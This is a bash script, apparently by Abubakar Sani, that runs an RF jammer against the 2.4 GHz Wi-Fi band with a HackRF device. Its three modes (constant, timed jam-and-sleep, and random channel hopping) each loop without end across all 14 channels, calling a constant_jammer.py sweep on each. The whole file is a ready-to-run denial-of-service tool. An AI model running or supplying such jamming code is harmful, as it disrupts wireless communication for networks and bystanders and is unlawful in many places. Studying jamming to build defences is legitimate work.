#!/bin/bash
# A signal generator bash script by Abubakar Sani

flag=0
n_channels=14
init_freq=2412000000
lst_freq=2484000000
ch_hop=5000000

echo "This code performs proactive RF Jamming"
read -p "Enter 1 for constant Jammer, 2 for random Jammer, 3 for random channel hopping jammer: " jammer

if [ $jammer -eq 1 ]
then
	channel=1
	while [ $flag != 1 ]
	do
		# Setting Carrier Center Frequency
		if [ $channel -eq 1 ]
		then		
			let "freq = $init_freq"
		elif [ $channel -eq 14 ]
		then
			let "freq = $lst_freq"
		else
			let "freq = $init_freq + ($channel-1) * $ch_hop"
		fi
	
		# Jamming the network
		python3 constant_jammer.py -a hackrf -f $freq --sweep -x 20M -y 1k
	
		# Next Channel
		if [ $channel -ge $n_channels ]
		then
			let "channel = 1"
		else
			((channel++))
		fi
	done		

elif [ $jammer -eq 2 ]
then
	read -p "Enter jamming time in sec: " tj
	read -p "Enter sleeping time in sec: " ts
	channel=1
	start=$SECONDS
	while [ $flag != 1 ]
	do
		# Setting Carrier Center Frequency
		if [ $channel -eq 1 ]
		then		
			let "freq = $init_freq"
		elif [ $channel -eq 14 ]
		then
			let "freq = $lst_freq"
		else
			let "freq = $init_freq + ($channel-1) * $ch_hop"
		fi
	
		# Jamming the network
		python3 constant_jammer.py -a hackrf -f $freq --sweep -x 20M -y 1k
	
		# Next Channel
		if [ $channel -ge $n_channels ]
		then
			let "channel = 1"
		else
			((channel++))
		fi
		duration=$(( SECONDS - start ))
		echo "the duration is $duration"
		if [ $duration -ge $tj ]
		then
			echo "sleeping"
			sleep $ts
			start=$SECONDS
		fi
	done
	
elif [ $jammer -eq 3 ]
then
	while [ $flag != 1 ]
	do
		# Setting Carrier Center Frequency
		let "channel = $RANDOM % $n_channels + 1"
		if [ $channel -eq 1 ]
		then		
			let "freq = $init_freq"
		elif [ $channel -eq 14 ]
		then
			let "freq = $lst_freq"
		else
			let "freq = $init_freq + ($channel-1) * $ch_hop"
		fi
	
		# Jamming the network
		python3 constant_jammer.py -a hackrf -f $freq --sweep -x 20M -y 1k

	done

else
	echo "invalid selection"
	break
fi


